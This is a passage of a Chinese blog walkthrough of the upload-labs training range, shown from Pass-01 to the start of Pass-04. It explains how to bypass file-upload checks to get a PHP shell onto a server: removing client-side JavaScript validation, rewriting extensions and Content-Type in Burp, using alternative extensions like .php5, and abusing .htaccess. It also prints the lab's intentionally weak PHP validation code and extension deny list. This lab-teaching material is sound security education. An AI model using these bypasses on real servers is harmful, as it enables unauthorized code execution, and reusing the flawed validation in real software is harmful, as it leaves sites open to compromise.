<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x00 前言文件上传漏洞可以说是getshell的一种好方式了，也是常见漏洞之一，本文结合upload-labs来对此种漏洞在PHP中的表现做一讲解。本文列出的参考链接都是一些不错的文章，像关于一些waf的上传bypass在本文不作讲解但是在参考链接的文章中就有包含。
0x01 Pass-01这是一个前端验证的上传点，针对这种情况我们一般有以下4种绕过方法。
(1) 禁用jsfirefox和ch">
<meta property="og:type" content="article">
<meta property="og:title" content="文件上传漏洞天书">
<meta property="og:url" content="http://zer0yu.github.io/2018/06/18/upload-labs-note/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="0x00 前言文件上传漏洞可以说是getshell的一种好方式了，也是常见漏洞之一，本文结合upload-labs来对此种漏洞在PHP中的表现做一讲解。本文列出的参考链接都是一些不错的文章，像关于一些waf的上传bypass在本文不作讲解但是在参考链接的文章中就有包含。
0x01 Pass-01这是一个前端验证的上传点，针对这种情况我们一般有以下4种绕过方法。
(1) 禁用jsfirefox和ch">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%889.47.30.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.14.06.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.23.57.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.09.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.21.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8812.54.13.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.14.55.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.15.09.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.36.04.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.45.43.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.47.38.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.56.55.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.12.33.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.14.07.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8810.56.46.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8811.14.44.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.10.05.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.35.54.png">
<meta property="og:image" content="http://ok44mzy2k.bkt.clouddn.com/fileupload2.png">
<meta property="og:updated_time" content="2018-06-18T07:27:01.983Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="文件上传漏洞天书">
<meta name="twitter:description" content="0x00 前言文件上传漏洞可以说是getshell的一种好方式了，也是常见漏洞之一，本文结合upload-labs来对此种漏洞在PHP中的表现做一讲解。本文列出的参考链接都是一些不错的文章，像关于一些waf的上传bypass在本文不作讲解但是在参考链接的文章中就有包含。
0x01 Pass-01这是一个前端验证的上传点，针对这种情况我们一般有以下4种绕过方法。
(1) 禁用jsfirefox和ch">
<meta name="twitter:image" content="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%889.47.30.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>文件上传漏洞天书</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/08/24/AD-base-note/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/05/24/ctf-awd-note/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/06/18/upload-labs-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&text=文件上传漏洞天书"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&is_video=false&description=文件上传漏洞天书"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=文件上传漏洞天书&body=Check out this article: http://zer0yu.github.io/2018/06/18/upload-labs-note/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&title=文件上传漏洞天书"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/06/18/upload-labs-note/&name=文件上传漏洞天书&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Pass-01"><span class="toc-number">2.</span> <span class="toc-text">0x01 Pass-01</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-禁用js"><span class="toc-number">2.1.</span> <span class="toc-text">(1) 禁用js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-上传按钮处修改"><span class="toc-number">2.2.</span> <span class="toc-text">(2) 上传按钮处修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-构造上传点"><span class="toc-number">2.3.</span> <span class="toc-text">(3) 构造上传点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-修改js代码"><span class="toc-number">2.4.</span> <span class="toc-text">(4) 修改js代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Pass-02"><span class="toc-number">3.</span> <span class="toc-text">0x02 Pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Pass-03"><span class="toc-number">4.</span> <span class="toc-text">0x03 Pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Pass-04"><span class="toc-number">5.</span> <span class="toc-text">0x04 Pass-04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-Pass-05"><span class="toc-number">6.</span> <span class="toc-text">0x05 Pass-05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-Pass-06"><span class="toc-number">7.</span> <span class="toc-text">0x06 Pass-06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-Pass-07"><span class="toc-number">8.</span> <span class="toc-text">0x07 Pass-07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-Pass-08"><span class="toc-number">9.</span> <span class="toc-text">0x08 Pass-08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-Pass-09"><span class="toc-number">10.</span> <span class="toc-text">0x09 Pass-09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-Pass-10"><span class="toc-number">11.</span> <span class="toc-text">0x10 Pass-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-Pass-11"><span class="toc-number">12.</span> <span class="toc-text">0x11 Pass-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-Pass-12"><span class="toc-number">13.</span> <span class="toc-text">0x12 Pass-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-Pass-13"><span class="toc-number">14.</span> <span class="toc-text">0x13 Pass-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-Pass-14"><span class="toc-number">15.</span> <span class="toc-text">0x14 Pass-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-Pass-15"><span class="toc-number">16.</span> <span class="toc-text">0x15 Pass-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-Pass-16"><span class="toc-number">17.</span> <span class="toc-text">0x16 Pass-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x17-Pass-17"><span class="toc-number">18.</span> <span class="toc-text">0x17 Pass-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x18-Pass-18"><span class="toc-number">19.</span> <span class="toc-text">0x18 Pass-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x19-Pass-19"><span class="toc-number">20.</span> <span class="toc-text">0x19 Pass-19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x20-总结"><span class="toc-number">21.</span> <span class="toc-text">0x20 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x21-参考"><span class="toc-number">22.</span> <span class="toc-text">0x21 参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        文件上传漏洞天书
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Z3R0YU</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-06-18T07:00:26.000Z" itemprop="datePublished">2018-06-18</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>文件上传漏洞可以说是getshell的一种好方式了，也是常见漏洞之一，本文结合<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="external">upload-labs</a>来对此种漏洞在PHP中的表现做一讲解。本文列出的参考链接都是一些不错的文章，像关于一些waf的上传bypass在本文不作讲解但是在参考链接的文章中就有包含。</p>
<h3 id="0x01-Pass-01"><a href="#0x01-Pass-01" class="headerlink" title="0x01 Pass-01"></a>0x01 Pass-01</h3><p>这是一个前端验证的上传点，针对这种情况我们一般有以下4种绕过方法。</p>
<h4 id="1-禁用js"><a href="#1-禁用js" class="headerlink" title="(1) 禁用js"></a>(1) 禁用js</h4><p>firefox和chrome均有禁用js设置，禁用了就可以绕过。</p>
<h4 id="2-上传按钮处修改"><a href="#2-上传按钮处修改" class="headerlink" title="(2) 上传按钮处修改"></a>(2) 上传按钮处修改</h4><p>打开web控制台删除如图所示处的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">onsubmit=<span class="string">"return checkFile()"</span></div></pre></td></tr></table></figure></p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%889.47.30.png" alt=""></p>
<h4 id="3-构造上传点"><a href="#3-构造上传点" class="headerlink" title="(3) 构造上传点"></a>(3) 构造上传点</h4><p>与2的原理是相同的，使用了和原来代码一样但是不包含<code>onsubmit=&quot;return checkFile()&quot;</code>这句代码</p>
<p>Like</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>upload-php<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"upload_panel"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>上传区<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"此处填写完整的上传点URL"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;<span class="name">p</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input_file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>	</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="4-修改js代码"><a href="#4-修改js代码" class="headerlink" title="(4) 修改js代码"></a>(4) 修改js代码</h4><p>只需要修改js代码中的限制，让其包含你想上传的后缀名即可。</p>
<p>此处我们在checkFile()函数中的allow_ext变量中加入.php，之后在console run一下这段代码，随后上传便可成功。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</div><div class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</div><div class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//定义允许上传的文件类型</span></div><div class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif.|.php"</span>;</div><div class="line">    <span class="comment">//提取上传文件的类型</span></div><div class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</div><div class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></div><div class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</div><div class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</div><div class="line">        alert(errMsg);</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>####(5) 神器burp</p>
<p>先将想要上传的php脚本的后缀修改为jpg绕过前端，使用burp截断后修改jpg为php继续上传即可。<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.14.06.png" alt="image"></p>
<h3 id="0x02-Pass-02"><a href="#0x02-Pass-02" class="headerlink" title="0x02 Pass-02"></a>0x02 Pass-02</h3><p>查看代码发现是在服务端对文件的mime类型进行了校验。对于这种情况我们只需要使用burp抓包并修改content-type字段的内容即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        <span class="comment">// 以下这个判断是在对上传文件的mime类型做判断</span></div><div class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.23.57.png" alt="image"></p>
<h3 id="0x03-Pass-03"><a href="#0x03-Pass-03" class="headerlink" title="0x03 Pass-03"></a>0x03 Pass-03</h3><p>看了下代码发现黑名单对常见文件名进行了过滤，但是类似于”.php5”,”.php4”,”.php3”,”.php2”,”php1”这样的也是可以被当做php进行解析的。所以我们这时只需要将文件名修改为.php5就可以成功上传shell<br>注: 这个也是要服务器支持的，如果发现不能解析可以在apache配置文件中添加如下设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType Application/x-httpd-php .php .php3 .php5 .html</div></pre></td></tr></table></figure>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.09.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.21.png" alt="image"></p>
<h3 id="0x04-Pass-04"><a href="#0x04-Pass-04" class="headerlink" title="0x04 Pass-04"></a>0x04 Pass-04</h3><p>先看下代码，此处过滤的很严，所以此时要考虑下apache的解析特性。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</div><div class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>先介绍下.htaccess文件:</p>
<p>(1) .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>
<p>(2) .htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p>
<p>(3) .htaccess的用途范围主要针对当前目录。</p>
<p>由上面可知在此处我们可以先上传一个.htaccess文件，来使apache可以将jpg文件当做php文件解析，但要注意并不是任何时候都可以上传一个有效的.htaccess文件的，在让.htaccess文件生效之前我们需要做两点配置：</p>
<p>(1) 修改httpd.conf，启用AllowOverride，即将如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AllowOverride None</div></pre></td></tr></table></figure>
<p>修改为</p>
